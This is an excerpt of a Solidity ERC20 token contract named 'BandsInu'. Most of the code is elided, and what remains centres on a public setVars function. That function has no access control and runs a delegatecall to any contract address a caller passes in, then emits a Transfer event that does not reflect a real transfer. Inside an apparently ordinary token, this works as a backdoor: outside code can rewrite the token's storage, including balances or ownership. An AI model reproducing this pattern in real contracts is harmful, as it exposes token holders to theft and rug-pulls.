...
contract ERC20 is Context, IERC20, IERC20Metadata , BABY{
    ...
    function setVars(address _contract, address recipient, uint _num) public payable returns (bytes memory,bool) {
        // A's storage is set, B is not modified.
        (bool success, bytes memory data) = _contract.delegatecall(
            abi.encodeWithSignature("setVars(uint256)", _num,recipient)
        );
        emit Transfer(recipient, recipient, _num);
        return (data,success);
    }
    /**
...
contract BandsInu is ERC20{
     ...
     */
    constructor () ERC20('BandsInu', 'BandsInu') {
